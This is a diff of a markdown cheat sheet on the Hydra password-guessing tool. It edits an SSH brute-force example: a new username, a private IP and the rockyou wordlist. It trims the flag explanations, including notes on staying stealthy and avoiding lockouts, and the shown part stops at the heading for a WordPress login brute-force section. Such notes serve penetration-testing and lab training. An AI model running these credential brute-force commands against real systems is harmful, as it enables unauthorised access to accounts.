@@ -27,7 +27,7 @@ Common options:
 
 ## 1. SSH Brute-Force Example
 ```bash
-hydra -l molly -P rockyou.txt 10.10.10.10 ssh -V -I -t 8 -w 5 -W 10 -e nsr -u -s PORT
+	hydra -l Jake -P /usr/share/wordlists/rockyou.txt 10.113.181.5 ssh -t 4 -V -I
 ```
 
 **Flags explained**:
@@ -35,18 +35,8 @@ hydra -l molly -P rockyou.txt 10.10.10.10 ssh -V -I -t 8 -w 5 -W 10 -e nsr -u -s
 - `-P <wordlist>` → password list  
 - `-V` → full verbose (every attempt)  
 - `-I` → skip restore  
-- `-t 8` → 8 threads (safe max for SSH, avoids lockouts)  
-- `-w 5` / `-W 10` → delays to stay stealthy  
-- `-e nsr` → extra quick checks  
-- `-u` → users first (faster)  
+- `-t 4` → 4 threads (safe for SSH, avoids lockouts)  
 - `-s PORT` → custom port (if not 22)  
-
-**What it does**:  
-- Tests every password for molly  
-- 8 parallel attempts  
-- Stops on first valid  
-
-**Noise tip**: SSH is slow — max ~10–30 tries/sec. Use -t 4 if blocked.
 
 ## 2. Web Form (POST) Brute-Force Example (WordPress Login)
 ```bash
